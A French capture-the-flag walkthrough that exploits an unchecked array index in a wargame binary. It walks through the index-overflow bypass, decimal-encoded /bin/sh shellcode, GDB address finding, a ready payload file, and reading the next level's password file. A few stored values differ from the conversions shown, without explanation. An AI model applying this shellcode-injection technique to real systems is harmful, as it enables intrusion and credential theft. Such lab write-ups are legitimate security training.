## 1. Comprendre la faille

La fonction `store_number` écrit dans un tableau de int de taille 100, sans aucune vérification, ce qui veut dire qu'on peut écrire où on veut.

## 2. Trouver l'offset EIP

On va d'abord trouver l'offset pour accéder à EIP. On procède à tâtons à partir de 100.

Sachant qu'on nous empêche d'écrire des index en multiple de 3, on va bypass ça en s'appuyant sur le fait que la machine est en 32 bits.

```text
1073741824 = 0x40000000
```

On sait que :

```text
0x40000000 << 2 = 0x100000000
```

Et en 32 bits :

```text
0x100000000 -> 0
```

Donc :

```text
1073741824
se comporte comme :
index 0
```

Donc pour les multiples de 3, on va partir de `1073741824`.

Après quelques essais, je trouve que le bon index pour atteindre EIP est `114`, qui est un multiple de 3, donc on passe plutôt par `1073741938` (`1073741824 + 114`).

## 3. Préparer le shellcode

On va utiliser un shellcode :

```text
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

Mais ce shellcode devra être transformé en décimal pour le faire entrer dans notre tableau.

```text
31 c0 50 68 => 0x6850c031 => 1750122545
2f 2f 73 68 => 0x68732f2f => 1752379183
68 2f 62 69 => 0x69622f68 => 1768042344
6e 89 e3 89 => 0x89e3896e => 2313398638
c1 89 c2 b0 => 0xb0c289c1 => 2965531073
0b cd 80 31 => 0x3180cd0b => 830524683
c0 40 cd 80 => 0x80cd40c0 => 2160939200
```

## 4. Trouver l'adresse du buffer

Il ne reste plus qu'à trouver l'adresse du début du buffer.

On lance GDB avec un breakpoint au niveau de la fonction `read_number`.

```gdb
(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) r
Starting program: /home/users/level07/level07

Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) x/x $ebp+0x8
0xffffd520: 0xffffd544
```

On voit que l'adresse de la première case du tableau est `0xffffd544` et que cette adresse est stockée à `0xffffd520`.

On pourrait se dire qu'on doit prendre directement l'adresse `0xffffd520`, mais non, car en faisant cette exécution avec GDB, les adresses ne seront pas pareilles en exécution réelle.

Donc on fait `0xffffd520 - 0xffffd544 = 0x24 = 36`.

```text
36 / 4 = 9
```

Donc l'adresse du tableau est 9 octets avant le tableau.

## 5. Vérifier l'index

On lance le programme seul :

```text
read
index : -9
```

On obtient `4294956388`.

## 6. Construire l'exploit

Tout est prêt pour l'exploit.

```bash
cat > /tmp/payload.txt << 'EOF'
store
2425393296
1073741824
store
2425393296
1
store
2425393296
2
store
2425393296
1073741827
store
1750122545
4
store
1752379183
5
store
1768042344
1073741830
store
2313390446
7
store
2965539265
8
store
830524683
1073741833
store
2160935104
10
store
4294956388
1073741938
quit
EOF
```

```
cat /tmp/payload.txt - | ./level07 
```

```
cat /home/users/level08/.pass 
```